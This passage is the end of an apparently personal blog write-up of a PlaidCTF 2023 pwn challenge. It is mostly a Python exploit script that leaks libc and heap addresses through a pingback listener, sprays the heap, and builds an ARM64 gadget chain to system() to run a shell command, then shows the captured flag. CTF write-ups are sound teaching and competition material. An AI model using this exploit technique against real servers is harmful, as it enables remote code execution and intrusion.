</span></span><span class="line"><span class="cl">                <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">                <span class="n">finish_ev</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># conn.send(b&#34;HTTP/1.1 200 OK\r\nServer: lol\r\nConnection: close\r\nContent-Length: 0\r\n\r\n&#34;)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># conn.close()</span>
</span></span><span class="line"><span class="cl">        <span class="k">assert</span> <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">        try:
</span></span></span><span class="line"><span class="cl"><span class="s2">            while True:
</span></span></span><span class="line"><span class="cl"><span class="s2">                conn.send(data)
</span></span></span><span class="line"><span class="cl"><span class="s2">                #conn.send(request_string.encode(&#34;utf-8&#34;))
</span></span></span><span class="line"><span class="cl"><span class="s2">                time.sleep(5)
</span></span></span><span class="line"><span class="cl"><span class="s2">        except BrokenPipeError:
</span></span></span><span class="line"><span class="cl"><span class="s2">            print(&#39;[DEBUG] addr:&#39;, addr, &#39;Connection closed by client?&#39;)
</span></span></span><span class="line"><span class="cl"><span class="s2">        except Exception as ex:
</span></span></span><span class="line"><span class="cl"><span class="s2">            print(&#39;[DEBUG] addr:&#39;, addr, &#39;Exception:&#39;, ex, )
</span></span></span><span class="line"><span class="cl"><span class="s2">        finally:
</span></span></span><span class="line"><span class="cl"><span class="s2">            conn.close()
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] create socket&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] bind:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] listen&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="s2">&#34;bye&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">result_dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] accept ... waiting&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span> <span class="c1"># socket, address</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] addr:&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handle_client</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">),</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">leak</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">finish_ev</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_dict</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="n">thr</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">leak_receiver</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">finish_ev</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">thr</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">random_hex</span> <span class="o">=</span> <span class="s1">&#39;d0bebc4a8f&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">s3</span> <span class="o">=</span> <span class="n">User</span><span class="p">(),</span> <span class="n">User</span><span class="p">(),</span> <span class="n">User</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user1-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user2-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user3-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Watch gold</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x4ff</span>
</span></span><span class="line"><span class="cl">    <span class="n">gold_url_1</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x4ff</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x43f</span>
</span></span><span class="line"><span class="cl">    <span class="n">gold_url_2</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x43f</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_2</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Watch bomb</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x7d7</span>
</span></span><span class="line"><span class="cl">    <span class="n">bomb_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x7d7</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">bomb_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Watch rum</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x7e8</span>
</span></span><span class="line"><span class="cl">    <span class="n">rum_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x7e8</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">rum_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Watch anchor</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Length need to be 0x800</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># The position of `bash xxx` need to be exact with this position</span>
</span></span><span class="line"><span class="cl">    <span class="n">anchor_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">PINGBACK_URL</span><span class="si">}</span><span class="s1">/?x=__/plugins&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x800</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">),</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">COMMAND</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">anchor_url</span><span class="p">,</span> <span class="mi">123</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified gold&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified bomb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified rum&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># input(&#34;wait&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Notified anchor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s2</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s3</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s1</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">finish_ev</span><span class="o">.</span><span class="n">wait</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;bye&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;libc&#34;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x170af8</span><span class="p">,</span> <span class="n">result_dict</span><span class="p">[</span><span class="s2">&#34;heap&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">M</span> <span class="o">=</span> <span class="s2">&#34;d&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">FLOWER</span> <span class="o">=</span> <span class="s2">&#34;E&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">114514</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_M</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">RANDOMISH_STRING_FOR_FLOWER</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">2467</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="n">PAYLOAD_OFFSET</span> <span class="o">=</span> <span class="p">[</span><span class="mi">258</span><span class="p">,</span> <span class="mi">550</span><span class="p">,</span> <span class="mi">729</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">517</span><span class="p">,</span> <span class="mi">941</span><span class="p">,</span> <span class="mi">999</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">490</span><span class="p">,</span> <span class="mi">544</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">off</span> <span class="ow">in</span> <span class="n">PAYLOAD_OFFSET</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">off</span><span class="p">][:</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">COMMAND</span><span class="p">)]</span> <span class="o">+</span> <span class="n">COMMAND</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc_base</span><span class="p">,</span> <span class="n">somewhere_on_heap</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc_base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">somewhere_on_heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># exit(0)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mov_x0_x19_blr_x20</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x21af8</span>
</span></span><span class="line"><span class="cl">    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x40890</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">mov_x0_x19_blr_x20</span><span class="p">,</span> <span class="n">somewhere_on_heap</span> <span class="o">+</span> <span class="n">HEAP_OFF</span><span class="p">,</span> <span class="n">system</span><span class="p">,</span> <span class="mh">0x4545454545454545</span><span class="p">,</span> <span class="mh">0x4646464646464646</span><span class="p">,</span> <span class="mh">0x4747474747474747</span><span class="p">,</span> <span class="mh">0x4848484848484848</span><span class="p">,</span> <span class="mh">0x4949494949494949</span><span class="p">,</span> <span class="mh">0x5050505050505050</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">secret_for_flow</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x4242424200000000</span> <span class="o">+</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">off</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">PAYLOAD_OFFSET</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">secret_for_flow</span><span class="p">[</span><span class="n">off</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">User</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s2">&#34;omguser&#34;</span><span class="p">,</span> <span class="s2">&#34;omgpass&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">s</span><span class="o">.</span><span class="n">unwatch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">M</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.1/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_M</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x4141414100000000</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="o">.</span><span class="n">trange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">watch</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">,</span> <span class="s2">&#34;http://127.0.0.2/&#34;</span> <span class="o">+</span> <span class="n">RANDOMISH_STRING_FOR_FLOWER</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">secret_for_flow</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Wait for auto vacuum</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">notify</span><span class="p">(</span><span class="n">FLOWER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><figure><a class="lightgallery" href="https://i.imgur.com/aH9dJHF.png" title="https://i.imgur.com/aH9dJHF.png" data-thumbnail="https://i.imgur.com/aH9dJHF.png" data-sub-html="<h2>Example usage of the script in local (because during making this writeup, the server is already down)</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/aH9dJHF.png"
            data-srcset="https://i.imgur.com/aH9dJHF.png, https://i.imgur.com/aH9dJHF.png 1.5x, https://i.imgur.com/aH9dJHF.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/aH9dJHF.png" />
    </a><figcaption class="image-caption">Example usage of the script in local (because during making this writeup, the server is already down)</figcaption>
    </figure>
<p>Finally, we got the flag. Thanks a lot to my amazing teammates who worked hard to solve this challenge.</p>
<blockquote>
<p><strong>Flag: PCTF{i_d0ne_br1ng_my_fullsome_c0ffers_and_all_1_fetched_w4s_thiS_scurvy_Flag}</strong></p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/plaidctf-2023/" data-title="Plaid CTF 2023" data-via="Chovid99" data-hashtags="Writeup,PlaidCTF,pwn,web,heap,postgresql,collation"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/plaidctf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/plaidctf/">PlaidCTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/postgresql/">Postgresql</a>,&nbsp;<a href="/tags/collation/">Collation</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/line-ctf-2023/" class="prev" rel="prev" title="LINE CTF 2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>LINE CTF 2023</a>
            <a href="/posts/tamuctf-2023/" class="next" rel="next" title="TAMUctf 2023">TAMUctf 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to 